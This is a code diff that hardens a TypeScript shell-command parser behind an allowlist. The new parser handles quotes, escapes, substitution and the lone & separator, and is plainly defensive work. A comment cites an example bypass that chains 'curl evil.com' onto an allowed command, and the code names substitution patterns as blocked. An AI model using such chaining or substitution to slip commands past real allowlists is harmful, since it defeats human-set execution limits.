@@ -14,19 +14,79 @@ export function extractExecutables(command: string): { ok: true; executables: st
   ok: false;
   reason: string;
 } {
-  if (/[`]|\$\(|<\(|>\(/.test(command)) {
-    return {
-      ok: false,
-      reason: "command substitution (`...`, $(...)) and process substitution are not permitted",
-    };
-  }
   const executables: string[] = [];
-  for (const segment of command.split(/\|\||&&|;|\||\n/)) {
-    const words = segment.trim().split(/\s+/).filter(Boolean);
+  let word = "";
+  let hasWord = false; // distinguishes "" (empty quoted word) from no word at all
+  let sawCommand = false; // current segment already yielded its executable
+  let inSingle = false;
+  let inDouble = false;
+
+  const endWord = () => {
+    if (!hasWord) return;
     // Skip leading VAR=value assignments.
-    const cmd = words.find((w) => !/^[A-Za-z_][A-Za-z0-9_]*=/.test(w));
-    if (cmd) executables.push(cmd);
+    if (!sawCommand && !/^[A-Za-z_][A-Za-z0-9_]*=/.test(word)) {
+      executables.push(word);
+      sawCommand = true;
+    }
+    word = "";
+    hasWord = false;
+  };
+
+  for (let i = 0; i < command.length; i++) {
+    const c = command[i];
+    if (inSingle) {
+      if (c === "'") inSingle = false;
+      else word += c;
+      continue;
+    }
+    if (c === "\\" && i + 1 < command.length) {
+      word += command[++i];
+      hasWord = true;
+      continue;
+    }
+    // Substitution is live outside single quotes, including inside double quotes.
+    if (
+      c === "`" || (c === "$" && command[i + 1] === "(") ||
+      (!inDouble && (c === "<" || c === ">") && command[i + 1] === "(")
+    ) {
+      return {
+        ok: false,
+        reason: "command substitution (`...`, $(...)) and process substitution are not permitted",
+      };
+    }
+    if (inDouble) {
+      if (c === '"') inDouble = false;
+      else word += c;
+      continue;
+    }
+    if (c === "'") {
+      inSingle = true;
+      hasWord = true;
+      continue;
+    }
+    if (c === '"') {
+      inDouble = true;
+      hasWord = true;
+      continue;
+    }
+    // Segment separators: ; | newline, and & — both background (`a & b`) and
+    // and-lists (`a && b`). A lone & must split like the others, or the command
+    // after it (`gh ... & curl evil.com`) runs unchecked past the allowlist.
+    if (c === ";" || c === "|" || c === "\n" || c === "&") {
+      if (c === "&" && command[i + 1] === "&") i++; // consume the second &
+      endWord();
+      sawCommand = false;
+      continue;
+    }
+    if (/\s/.test(c)) {
+      endWord();
+      continue;
+    }
+    word += c;
+    hasWord = true;
   }
+  if (inSingle || inDouble) return { ok: false, reason: "unbalanced quotes" };
+  endWord();
   if (executables.length === 0) return { ok: false, reason: "no command found" };
   return { ok: true, executables };
 }
